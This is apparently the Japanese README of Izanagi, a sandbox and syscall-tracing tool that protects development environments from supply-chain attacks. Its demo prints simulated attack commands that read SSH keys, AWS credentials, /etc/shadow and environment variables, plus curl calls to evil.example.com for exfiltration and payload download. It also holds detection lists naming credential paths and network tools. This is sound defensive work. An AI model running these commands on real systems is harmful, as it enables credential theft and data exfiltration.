# Izanagi

サプライチェーン攻撃から開発環境を守るためのサンドボックスツール。

開発環境を隔離した空間で動かし、syscall レベルでファイルアクセス・ネットワーク通信を記録・監視する。
悪意あるパッケージが環境変数の窃取や外部へのデータ送信を試みた場合、ログから検知できる。

## 脅威モデル

サプライチェーン攻撃では、以下のような手口が使われる:

1. **環境変数の窃取** — `postinstall` スクリプト等が `process.env` や `/proc/self/environ` から API キー・クラウド認証情報を読み取る
2. **外部への送信** — 窃取したデータを攻撃者のサーバへ HTTP/DNS リクエストで送信する
3. **ファイルシステムの探索** — `~/.ssh`、`~/.aws/credentials`、`~/.gitconfig` 等を読み取る

Izanagi は隔離環境によりホストを保護しつつ、syscall トレーシングでこれらの挙動を記録・検知する。

## アーキテクチャ

5つのレイヤーで構成され、各レイヤーは独立して差し替え可能。

```
┌─────────────────────────────────────────────────────┐
│  Engine                                              │
│  全体のライフサイクル管理                                │
│  Sandbox + Tracer + Detector を合成                   │
├─────────────────────────────────────────────────────┤
│  Detector (共通)                                     │
│  ルールに基づく検知。全バックエンド共通                    │
│  ├── SuspiciousPathRule   (機密ファイルアクセス検知)     │
│  ├── NetworkAllowlistRule (許可リスト外通信検知)         │
│  ├── UnexpectedExecRule   (不審コマンド実行検知)         │
│  └── EnvAccessRule        (環境変数窃取検知)            │
├─────────────────────────────────────────────────────┤
│  Tracer                                              │
│  syscall イベントの収集                                │
│  ├── eBPF         (Linux — aya クレート)              │
│  ├── DTrace       (macOS — dtrace サブプロセス)        │
│  ├── ETW          (Windows — 将来)                    │
│  └── vm-agent     (コンテナ/VM → host, HMAC 認証付き)  │
├─────────────────────────────────────────────────────┤
│  MCP Server                                          │
│  AI コーディングエージェント向け stdio transport       │
│  ├── sandbox_status  (サンドボックス状態取得)          │
│  ├── sandbox_exec    (コマンド実行)                   │
│  └── sandbox_shell   (シェルコマンド実行)              │
├─────────────────────────────────────────────────────┤
│  Protocol                                            │
│  host ↔ agent 間通信                                  │
│  ├── bincode ワイヤーフォーマット (サイズ制限 1MiB)       │
│  ├── HMAC-SHA256 認証 (Hello 含む全メッセージ保護)       │
│  ├── Exec / ExecResult メッセージ (コマンド実行)         │
│  ├── Shell / ShellData / ShellClose (対話シェル, PTY)  │
│  └── TCP トランスポート                                │
├─────────────────────────────────────────────────────┤
│  Sandbox                                             │
│  隔離環境の管理                                        │
│  ├── Apple Container (macOS — Virtualization.fw)     │
│  ├── QEMU           (macOS / Linux — VM 隔離)        │
│  ├── Landlock       (Linux native)                   │
│  └── AppContainer   (Windows — 将来)                  │
└─────────────────────────────────────────────────────┘
```

### バックエンドの組み合わせ例

| ユースケース | Sandbox | Tracer |
|------------|---------|--------|
| コンテナ隔離（推奨・macOS） | Apple Container | vm-agent |
| VM 最大隔離 | QEMU | vm-agent (eBPF) |
| 軽量・Linux | Landlock | eBPF |
| 監視のみ（隔離なし） | なし | eBPF / DTrace |

## クイックスタート

### 1. ビルド

```bash
# macOS
cargo build --release

# Linux (Landlock sandbox + eBPF tracer)
cargo build --release --features landlock,ebpf
```

### 2. ネイティブサンドボックスで実行

macOS では Apple Container、Linux では Landlock によるネイティブサンドボックスで実行:

```bash
# コマンドをサンドボックス内で実行
./target/release/izanagi exec --sandbox=native -- npm install

# サンドボックスを起動して待機（Ctrl+C または izanagi down で停止）
./target/release/izanagi up --sandbox=native

# 別ターミナルから停止
./target/release/izanagi down
```

### 3. コンテナイメージで実行（QEMU / Apple Container）

より強い隔離が必要な場合:

```bash
# CI から izanagi-agent の musl バイナリをダウンロードして
chmod +x image/build.sh
./image/build.sh /path/to/izanagi-agent

# Docker / Apple Container でコンテナを起動
container run --rm -d --name izanagi-sandbox \
  -p 9001:9001 \
  -e IZANAGI_SHARED_SECRET=your-secret \
  -v .:/workspace \
  izanagi-vm
```

## インストール

```bash
# ビルド + ~/.izanagi/bin にインストール
make install

# PATH に追加
export PATH="$HOME/.izanagi/bin:$PATH"

# アンインストール
make uninstall
```

## 使い方

```bash
# 対話形式で設定ファイルを生成
izanagi init

# サンドボックスを起動（Ctrl+C または izanagi down で停止）
izanagi up

# サンドボックス内でコマンドを実行
izanagi exec -- npm install

# サンドボックス内で対話シェルを起動（PTY 対応）
izanagi shell

# バックエンドを指定
izanagi up --sandbox=apple-container    # Apple Container (macOS)
izanagi up --sandbox=qemu --tracer=vm-agent  # QEMU VM
izanagi up --sandbox=native             # Apple Container / Landlock

# Tracer なしで Sandbox のみ起動（root 不要）
izanagi up --sandbox=native --no-tracer

# syscall ログを確認
izanagi logs

# 不審なアクセスのみ表示
izanagi logs --suspicious

# サンドボックスを停止（PID ファイル経由で SIGTERM）
izanagi down

# 通信を pcap 形式で記録
izanagi up --pcap /tmp/capture.pcap

# 現在の設定を表示
izanagi config show

# MCP Server として起動（Claude Code 等の AI エージェント向け）
izanagi mcp
```

### MCP Server

izanagi を [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) Server として起動し、
AI コーディングエージェント（Claude Code, Codex 等）からサンドボックスを操作できる。

```bash
# stdio transport で MCP Server を起動（設定ファイル不要）
izanagi mcp
```

提供ツール:

| ツール | 説明 |
|--------|------|
| `sandbox_status` | サンドボックスの稼働状態を取得 |
| `sandbox_exec` | サンドボックス内でコマンドを実行 |
| `sandbox_shell` | サンドボックス内でシェルコマンドを実行 (`/bin/sh -c`) |

Claude Desktop の設定例:
```json
{
  "mcpServers": {
    "izanagi": {
      "command": "izanagi",
      "args": ["mcp"]
    }
  }
}
```

## 設定

`izanagi init` で対話形式で設定ファイルを生成できる。
設定ファイルは `~/.izanagi/settings/{pwd の SHA256 ハッシュ}/izanagi.toml` に保存され、
プロジェクトディレクトリごとに独立した設定を持てる。

```toml
[sandbox]
backend = "native"              # native | apple-container | qemu
tracer = "auto"                 # auto | ebpf | dtrace | vm-agent | none
require_auth = true             # HMAC 認証を必須にする (デフォルト true)

[sandbox.qemu]
cpus = 2
memory = "4G"
image = "default"

[share]
paths = ["."]
mount_point = "/workspace"

[monitor]
syscalls = ["file", "network", "process", "env"]

[detect]
suspicious_paths = [
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/*",
    "~/.aws/*",
    "~/.gnupg/*",
    "~/.config/gh/*",
]
allowed_hosts = [
    "93.184.216.34",             # IP アドレスで指定
    "registry.npmjs.org",        # ドメイン名も可（DNS 解決される）
]
# known_processes = ["node", "npm", "cargo"]  # 未指定時はデフォルトベースラインを使用

[dns_proxy]
enabled = true
listen = "127.0.0.1:15353"       # DNS プロキシのリッスンアドレス

# [sandbox.apple_container]
# image = "izanagi-vm"
# network = "none"               # ネットワーク完全遮断（現在未サポート、dns_proxy 推奨）
```

## バックエンド自動選択

Engine は設定とプラットフォームに応じて最適な Sandbox / Tracer を自動選択する。

| 設定 | Linux | macOS |
|------|-------|-------|
| `backend = "native"` | Landlock | Apple Container |
| `backend = "apple-container"` | エラー | Apple Container |
| `backend = "qemu"` | QEMU (KVM) | QEMU (HVF) |
| `tracer = "auto"` | eBPF | DTrace |
| `tracer = "ebpf"` | eBPF | エラー |
| `tracer = "dtrace"` | エラー | DTrace |
| `tracer = "vm-agent"` | QEMU / Container 必須 | QEMU 必須 |
| `tracer = "none"` | Sandbox のみ（監視なし） | Sandbox のみ（監視なし） |


## パケット検閲

DNS・HTTP・HTTPS レベルでネットワーク通信を検閲し、不正な外部通信を可視化・制御する。

```
┌──────────────────────────────────────────────────────────┐
│ サンドボックス内                                           │
│  npm install → DNS クエリ → HTTP/HTTPS リクエスト          │
└──────────┬───────────────────────────────────────────────┘
           │
┌──────────▼───────────────────────────────────────────────┐
│ izanagi-dns-proxy                                        │
│  allowed_hosts にないドメイン → ダミー IP (127.0.0.1)      │
│  allowed_hosts にあるドメイン → 上流 DNS に転送             │
├──────────────────────────────────────────────────────────┤
│ izanagi-http-capture                                     │
│  HTTP (平文): リクエスト内容をログ → 403 Forbidden          │
│  HTTPS (TLS MITM): CA で証明書動的生成 → 復号 → ログ       │
│    └── allowed_hosts → シークレット置換 → 上流転送          │
│    └── それ以外 → 403 Forbidden                           │
└──────────────────────────────────────────────────────────┘
```

### DNS プロキシ

```bash
cd izanagi-dns-proxy
cargo run -- --listen 127.0.0.1:15353 --config ../izanagi.toml
```

`izanagi.toml` の `detect.allowed_hosts` に基づいてフィルタ。許可リスト外はダミー IP を返す。

### HTTP/HTTPS キャプチャ & TLS MITM プロキシ

```bash
cd izanagi-http-capture
cargo run -- --listen-http 127.0.0.1:18080 --listen-https 127.0.0.1:18443 \
  --ca-cert-out /tmp/izanagi-ca.pem \
  --secret-map "DUMMY_TOKEN=real-api-key" \
  --allowed-host "registry.npmjs.org"
```

- **HTTP**: リクエストの Host, Method, Path, Body をログに記録し 403 を返す
- **HTTPS**: 起動時に自己署名 CA を生成、SNI に応じてサーバー証明書をオンデマンド発行
- **上流転送**: `--allowed-host` で許可されたホストにはシークレット置換後に転送
- **シークレット置換**: `--secret-map DUMMY=REAL` でサンドボックス内のダミー値を本物に書き換え

### サンドボックス DNS 統合

```toml
[dns_proxy]
enabled = true
listen = "127.0.0.1:15353"
```

`izanagi up` 時にサンドボックスの DNS をプロキシに向ける:
- **Apple Container**: `container run --dns <ip>`
- **QEMU**: `-netdev user,...,dns=<ip>`

## 検知ルール

| ルール | 検知対象 | 深刻度 |
|--------|---------|--------|
| SuspiciousPathRule | `~/.ssh/*`, `~/.aws/*` 等の機密ファイルへのアクセス（glob パターン） | Critical |
| NetworkAllowlistRule | `allowed_hosts` 外への connect/sendto（DNS 解決対応、デフォルト全通信警告） | Warn |
| UnexpectedExecRule | curl, wget, nc 等の不審コマンドの execve | Warn |
| EnvAccessRule | `/proc/self/environ`, `/proc/<pid>/environ` への open/readlink | Critical |
| ProcessBaselineRule | ベースライン外の未知プロセスの execve（設定で既知プロセスを定義可能） | Warn |

## 記録する syscall

| カテゴリ | 対象 syscall | 検知できる挙動 |
|---------|-------------|--------------|
| ファイル | open, openat, read, write, stat, access | 機密ファイルへのアクセス |
| ネットワーク | connect, sendto, recvfrom, socket, bind | 外部への不正な通信 |
| プロセス | execve, clone, fork | 予期しないプロセス起動 |
| 環境 | readlink(/proc/self/environ) | 環境変数の窃取 |

## ログ出力例

```
[2026-03-24 10:32:15] WARN  pid=1234 npm/postinstall: open("/home/user/.ssh/id_rsa", O_RDONLY) → EACCES
[2026-03-24 10:32:15] WARN  pid=1234 npm/postinstall: connect(104.26.10.78:443) → not in allowed_hosts
[2026-03-24 10:32:16] INFO  pid=1234 npm/postinstall: open("/workspace/node_modules/.cache", O_WRONLY|O_CREAT)
```

ログは `~/.izanagi/logs/` にファイル永続化され、`izanagi logs` で閲覧可能。
ファイルパーミッションは 0600、ディレクトリは 0700 で保護される。

## プロジェクト構成

```
izanagi/                     # ホスト側メインクレート (stable Rust, edition 2024)
├── src/
│   ├── main.rs              # CLI エントリポイント (clap) + PID ファイル管理
│   ├── config.rs            # izanagi.toml パース・バリデーション
│   ├── event.rs             # SyscallEvent, Syscall, SyscallArg (コアデータ型)
│   ├── detector.rs          # Detector, Rule trait, Alert
│   ├── rules.rs             # 組み込み検知ルール 4 種
│   ├── engine.rs            # Engine (Sandbox + Tracer + Detector 合成 + バックエンド選択)
│   ├── sandbox.rs                  # Sandbox trait, SandboxConfig
│   ├── apple_container_sandbox.rs  # Apple Container Sandbox (macOS)
│   ├── landlock_sandbox.rs  # Landlock Sandbox (Linux, kernel 5.13+)
│   ├── qemu_sandbox.rs      # QEMU Sandbox (VM 隔離, HVF/KVM, virtio-9p)
│   ├── tracer.rs            # Tracer trait, MockTracer
│   ├── ebpf_tracer.rs       # eBPF Tracer (Linux, aya)
│   ├── dtrace_tracer.rs     # DTrace Tracer (macOS, D スクリプト動的生成, スキーマ駆動)
│   ├── vm_agent_tracer.rs   # VM Agent Tracer (TCP, HMAC 認証付き)
│   ├── mcp.rs               # MCP JSON-RPC 2.0 型定義 + ツールスキーマ
│   ├── pcap_writer.rs       # pcap ファイル書き込み (通信キャプチャ)
│   ├── protocol.rs          # host ↔ agent 通信プロトコル (bincode + HMAC + Exec + Shell)
│   ├── log_formatter.rs     # アラートフォーマッタ (色分け + サニタイズ)
│   ├── log_storage.rs       # ログ永続化 (BufWriter + Mutex, ストリーミング読込)
│   ├── session.rs           # セッション管理 (JSON 永続化)
│   ├── util.rs              # 共通ユーティリティ (expand_tilde 等)
│   └── commands/            # CLI サブコマンド
│       ├── init.rs          # izanagi init (対話的設定生成)
│       ├── up.rs            # izanagi up (サンドボックス起動)
│       ├── down.rs          # izanagi down (停止)
│       ├── exec.rs          # izanagi exec (コマンド実行)
│       ├── shell.rs         # izanagi shell (対話シェル, PTY)
│       └── mcp.rs           # izanagi mcp (MCP Server, stdio transport)
├── packer/                  # Packer テンプレート (QEMU VM イメージ)
│   ├── debian.pkr.hcl       # Debian aarch64 (推奨)
│   ├── alpine.pkr.hcl       # Alpine aarch64 (軽量)
│   └── http/preseed.cfg     # Debian preseed (自動インストール)
├── izanagi-common/          # eBPF ↔ ユーザー空間の共有型 (#[repr(C)], no_std)
├── izanagi-ebpf/            # eBPF プログラム (nightly Rust, aya-ebpf)
├── izanagi-agent/           # VM Agent バイナリ (コンテナ/VM 内で動作)
├── izanagi-dns-proxy/       # DNS プロキシ (allowed_hosts フィルタ, UDP+TCP)
├── izanagi-http-capture/    # HTTP キャプチャ + TLS MITM プロキシ + シークレット置換
├── image/                   # コンテナイメージ
│   ├── Dockerfile           # Alpine 3.23 + izanagi-agent
│   ├── entrypoint.sh        # HMAC シークレット設定 + init 起動
│   ├── izanagi-agent.initd  # OpenRC init スクリプト
│   └── build.sh             # Apple Container / Docker 自動判定ビルド
├── examples/
│   └── connect_agent.rs     # agent 接続テストツール (HMAC 対応)
├── tools/
│   └── tasks.py             # タスク管理 CLI (SQLite)
├── .github/workflows/       # CI (Linux + macOS) + agent ビルド
├── .claude/agents/          # Claude Code サブエージェント定義
├── Makefile                 # ビルド・インストール・イメージ作成
└── tasks.db                 # タスク DB
```

## 環境構築

### 必須

```bash
# Rust (stable)
rustup install stable
```

### agent クロスビルド (QEMU / Apple Container 使用時)

macOS から Linux 向けの agent バイナリをクロスコンパイルするために必要。

```bash
# Zig (リンカとして使用)
brew install zig

# cargo-zigbuild
cargo install cargo-zigbuild

# glibc ターゲット (Debian VM 向け)
rustup target add aarch64-unknown-linux-gnu

# musl ターゲット (Alpine VM / コンテナ向け)
rustup target add aarch64-unknown-linux-musl
```

### eBPF プログラムビルド (QEMU + vm-agent tracer 使用時)

VM 内の eBPF tracer で syscall を監視する場合に必要。

```bash
# nightly Rust + rust-src
rustup install nightly
rustup component add rust-src --toolchain nightly

# LLVM (bpf-linker が使用)
brew install llvm

# bpf-linker
cargo +nightly install bpf-linker
```

### QEMU VM イメージ作成

```bash
# QEMU
brew install qemu

# Packer (VM イメージビルダー)
brew install hashicorp/tap/packer
```

### 全部入りセットアップ (macOS)

```bash
# 一括インストール
brew install zig qemu llvm hashicorp/tap/packer
cargo install cargo-zigbuild
rustup install nightly
rustup component add rust-src --toolchain nightly
rustup target add aarch64-unknown-linux-gnu aarch64-unknown-linux-musl
cargo +nightly install bpf-linker
```

## ビルド

```bash
# ホスト側 (macOS)
cargo build --release

# Linux (Landlock sandbox + eBPF tracer)
cargo build --release --features landlock,ebpf
```

### Makefile ターゲット

| ターゲット | 説明 |
|-----------|------|
| `make build` | ホスト側バイナリをビルド |
| `make build-agent-gnu` | agent を Linux glibc クロスビルド (Debian VM 向け) |
| `make build-agent` | agent を Linux musl クロスビルド (Alpine VM 向け) |
| `make build-ebpf` | eBPF プログラムをビルド (nightly + LLVM 必要) |
| `make build-all` | ホスト + agent + eBPF を全ビルド |
| `make install` | ホスト側バイナリを `~/.izanagi/bin` にインストール |
| `make qemu-image` | QEMU qcow2 イメージをビルド (Debian, agent + eBPF 含む) |
| `make qemu-image-quick` | 既存の agent + eBPF バイナリで QEMU イメージをビルド |
| `make image` | コンテナイメージをビルド (Debian) |
| `make test` | テスト実行 |
| `make lint` | clippy + fmt チェック |

### QEMU VM イメージの作成

agent バイナリと eBPF オブジェクトを Packer で qcow2 イメージにベイクする。

```bash
# フルビルド (agent + eBPF + Packer を一括実行)
make qemu-image

# 個別ビルド後にイメージ作成
make build-agent-gnu
make build-ebpf
make qemu-image-quick

# Alpine イメージ（軽量、eBPF なし）
make qemu-image-alpine
```

### Apple Container イメージの作成

```bash
# agent を musl クロスビルドしてからイメージビルド
make build-agent
./image/build.sh izanagi-agent/target/aarch64-unknown-linux-musl/release/izanagi-agent
```

## デモ: サプライチェーン攻撃の検知

QEMU VM サンドボックス内で悪意ある npm パッケージの postinstall スクリプトを実行し、攻撃がブロックされる様子を確認する。

```bash
bash demo/run-inline.sh
```

```
> mal@1.0.0 postinstall
> node postinstall.js

=== Supply Chain Attack Simulation ===
user: izanagi  home: /home/izanagi

[attack 1: SSH 秘密鍵の窃取]
$ cat ~/.ssh/id_rsa
cat: can't open '/home/izanagi/.ssh/id_rsa': No such file or directory
✓ BLOCKED

[attack 2: AWS クレデンシャルの窃取]
$ cat ~/.aws/credentials
cat: can't open '/home/izanagi/.aws/credentials': No such file or directory
✓ BLOCKED

[attack 3: /etc/shadow の読み取り]
$ cat /etc/shadow
cat: can't open '/etc/shadow': Permission denied
✓ BLOCKED

[attack 4: 環境変数の窃取]
$ cat /proc/self/environ | tr '\0' '\n' | head -5
✓ BLOCKED

[attack 5: 窃取データの外部送信]
$ curl -s --max-time 3 -X POST -d stolen=ssh-key http://evil.example.com/exfil
✓ BLOCKED

[attack 6: リバースシェル用ペイロードの取得]
$ curl -s --max-time 3 http://evil.example.com/payload -o /tmp/payload
✓ BLOCKED

=== Simulation Complete ===
```

| 攻撃 | 手法 | サンドボックスの防御 |
|------|------|---------------------|
| SSH 鍵窃取 | `cat ~/.ssh/id_rsa` | ENOENT (VM 内にファイルなし) |
| AWS 認証情報窃取 | `cat ~/.aws/credentials` | ENOENT |
| shadow 読み取り | `cat /etc/shadow` | EACCES (非特権ユーザー) |
| 環境変数窃取 | `cat /proc/self/environ` | ENOENT (procfs 未マウント) |
| データ外部送信 | `curl -X POST http://evil.example.com` | タイムアウト (到達不能) |
| ペイロード取得 | `curl http://evil.example.com/payload` | タイムアウト (到達不能) |

## CI

GitHub Actions で Linux (ubuntu-latest) と macOS (macos-latest) の CI を実行。

- **test**: Linux・macOS で本体をテスト（Linux は `--features landlock,ebpf`）
- **component-tests**: agent、DNS proxy、HTTP capture、common crate を個別にテスト
- **quality**: rustfmt と Clippy による静的チェック
- **dependency-review / RustSec**: PRで追加される脆弱な依存関係と既存のRust依存関係を検査
- **CodeQL / Gitleaks**: Rustコードの脆弱性とコミット内のシークレットを検査
- **Dependabot**: Cargo依存関係とGitHub Actionsを週次更新
- Rust バージョンは `1.93.1` に固定

## ライセンス

MIT
